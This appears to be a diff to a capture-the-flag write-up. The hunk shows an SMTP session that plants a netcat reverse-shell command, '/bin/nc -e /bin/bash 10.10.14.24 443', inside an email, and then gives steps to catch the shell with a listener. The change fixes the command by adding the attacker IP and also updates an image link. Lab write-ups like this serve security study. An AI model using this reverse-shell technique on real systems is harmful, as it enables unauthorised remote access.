@@ -236,14 +236,14 @@ DATA
 354 Ok Send data ending with <CRLF>.<CRLF>
 FROM: hardyboy@10.10.14.24
 '
-/bin/nc -e /bin/bash 443
+/bin/nc -e /bin/bash 10.10.14.24 443
 .
 250 2.6.0 Message received
 quit
 221 2.0.0 solidstate Service closing transmission channel
 Connection closed by foreign host.
 ```
-![image](https://user-images.githubusercontent.com/83878909/236787308-8cf8a5eb-a280-47b4-ad74-b1aedb3181ff.png)
+![image](https://user-images.githubusercontent.com/83878909/236798824-54cb0ab9-c2f0-4ecc-aa60-5226545540d0.png)
 
   - Start a `netcat` listener on port `443`.
   - Trigger the email to receive a reverse shell by logging in to a user's account.
